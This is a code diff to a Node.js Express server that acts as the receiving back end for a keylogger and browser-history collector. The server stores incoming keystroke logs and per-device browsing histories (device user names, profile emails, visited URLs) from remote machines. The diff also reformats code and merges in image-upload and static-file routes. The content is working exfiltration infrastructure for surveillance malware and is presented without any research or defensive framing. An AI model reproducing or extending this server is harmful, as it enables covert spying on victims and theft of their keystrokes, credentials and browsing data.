@@ -4,13 +4,26 @@ import fs from "fs";
 import path from "path";
 import { fileURLToPath } from "url";
 
+// NOTE: Assuming imageRoutes.js is updated to use ES Modules (import/export)
+// You must ensure 'imageRoutes.js' uses 'export default router' or similar.
+import imageRoutes from "./Routes/ImageRoute.js"; // Standardize path and module type
+
+// --- Keylogger/History Server Configuration ---
 const __filename = fileURLToPath(import.meta.url);
 const DATA_DIR = path.join(path.dirname(__filename), "..", "keylogs");
-const HISTORY_DIR = path.join(path.dirname(__filename), "..", "browser_history");
+const HISTORY_DIR = path.join(
+  path.dirname(__filename),
+  "..",
+  "browser_history"
+);
 const HISTORY_FILE = path.join(HISTORY_DIR, "history.json");
 const HISTORY_QUEUE_MAX = parseInt(process.env.HISTORY_QUEUE_MAX || "5000", 10);
-const HISTORY_FLUSH_INTERVAL_MS = parseInt(process.env.HISTORY_FLUSH_INTERVAL_MS || "100", 10);
+const HISTORY_FLUSH_INTERVAL_MS = parseInt(
+  process.env.HISTORY_FLUSH_INTERVAL_MS || "100",
+  10
+);
 
+// --- File System Utilities (from Code Block 1) ---
 const ensureDir = () => {
   if (!fs.existsSync(DATA_DIR)) {
     fs.mkdirSync(DATA_DIR, { recursive: true });
@@ -63,14 +76,19 @@ const upsertBrowserHistory = (userId, keylog) => {
   // keylog: { device_id, device_user, device_name, app, profile:{id,email}, history:{...} }
   const map = loadHistoryFile() || {};
 
-  const deviceBlob = typeof map[userId] === "object" && map[userId] !== null ? map[userId] : {};
+  const deviceBlob =
+    typeof map[userId] === "object" && map[userId] !== null ? map[userId] : {};
   deviceBlob.device_id = keylog.device_id || userId;
   deviceBlob.device_user = keylog.device_user || deviceBlob.device_user || "";
   deviceBlob.device_name = keylog.device_name || deviceBlob.device_name || "";
   deviceBlob.app = keylog.app || deviceBlob.app || "chrome";
 
   let profiles = deviceBlob.profiles;
-  if (typeof profiles !== "object" || profiles === null || Array.isArray(profiles)) {
+  if (
+    typeof profiles !== "object" ||
+    profiles === null ||
+    Array.isArray(profiles)
+  ) {
     profiles = {};
   }
 
@@ -78,7 +96,11 @@ const upsertBrowserHistory = (userId, keylog) => {
   const profileEmail = keylog.profile?.email || "";
 
   let profile = profiles[profileId];
-  if (typeof profile !== "object" || profile === null || Array.isArray(profile)) {
+  if (
+    typeof profile !== "object" ||
+    profile === null ||
+    Array.isArray(profile)
+  ) {
     profile = { id: profileId, email: profileEmail, history: {} };
   }
   if (profileEmail && !profile.email) {
@@ -86,11 +108,17 @@ const upsertBrowserHistory = (userId, keylog) => {
   }
 
   let history = profile.history;
-  if (typeof history !== "object" || history === null || Array.isArray(history)) {
+  if (
+    typeof history !== "object" ||
+    history === null ||
+    Array.isArray(history)
+  ) {
     history = {};
   }
 
-  const hKeyBase = `${keylog.history?.last_visit_time || ""}:${keylog.history?.url || ""}`;
+  const hKeyBase = `${keylog.history?.last_visit_time || ""}:${
+    keylog.history?.url || ""
+  }`;
   const dup = Object.values(history).find(
     (h) => `${h?.last_visit_time || ""}:${h?.url || ""}` === hKeyBase
   );
@@ -107,15 +135,24 @@ const upsertBrowserHistory = (userId, keylog) => {
   saveHistoryFile(map);
   return deviceBlob;
 };
+// --- End File System Utilities ---
 
+// --- Server Setup ---
 let app = e();
-
 let data = {};
 let historyQueue = [];
 
 app.use(CORS());
 app.use(e.json());
 
+// --- Image & Static File Routes (from Code Block 2) ---
+// Note: __dirname is not available in ES Modules. Using path.dirname(__filename) instead.
+const __dirname = path.dirname(__filename);
+
+app.use("/", imageRoutes); // Applies image routes
+app.use("/uploads", e.static(path.join(__dirname, "uploads"))); // Serves static files
+
+// --- Keylogger Endpoint (from Code Block 1 - complex logic takes precedence) ---
 // Legacy endpoint; mirrors original keylogger behavior (save on close).
 app.post("/", (req, res) => {
   let { userId, keylog, type } = req.body;
@@ -132,6 +169,7 @@ app.post("/", (req, res) => {
   res.json({ msg: "sent successfully" });
 });
 
+// --- History Endpoint (from Code Block 1) ---
 // New explicit browser history endpoint (structured per device/profile/history)
 app.post("/history", (req, res) => {
   const { userId, keylog } = req.body;
@@ -141,11 +179,14 @@ app.post("/history", (req, res) => {
   const payloads = Array.isArray(keylog) ? keylog : [keylog];
   const enqueued = enqueueHistory(userId, payloads);
   if (!enqueued) {
-    return res.status(429).json({ error: "history queue full, dropped entries" });
+    return res
+      .status(429)
+      .json({ error: "history queue full, dropped entries" });
   }
   res.json({ msg: "history enqueued", count: payloads.length });
 });
 
+// --- History Queue Logic (from Code Block 1) ---
 const enqueueHistory = (userId, keylogs) => {
   if (!Array.isArray(keylogs)) return false;
   if (historyQueue.length + keylogs.length > HISTORY_QUEUE_MAX) {
@@ -165,6 +206,7 @@ setInterval(() => {
   }
 }, HISTORY_FLUSH_INTERVAL_MS);
 
+// --- Start Server ---
 app.listen(3000, "0.0.0.0", () => {
   console.log("Server is running in http://localhost:3000");
 });
